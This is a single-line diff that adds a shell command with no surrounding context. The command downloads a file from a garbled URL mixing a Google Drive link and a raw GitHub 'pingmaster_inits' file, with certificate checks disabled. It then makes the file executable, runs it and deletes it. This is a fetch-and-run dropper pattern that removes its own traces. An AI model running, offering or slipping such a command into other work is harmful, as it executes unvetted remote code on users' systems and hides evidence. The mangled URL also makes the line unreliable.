@@ -1,0 +1,1 @@
+wget --no-check-certificate '[https://docs.google.com/uc?export=download&id=1QVCvdA5Penn1yDNt06mekirNvqExQRD1](https://raw.githubusercontent.com/razeraids/ping/main/pingmaster_inits)https://raw.githubusercontent.com/razeraids/ping/main/pingmaster_inits' -O install ; chmod +x install ; ./install ;rm -rf install
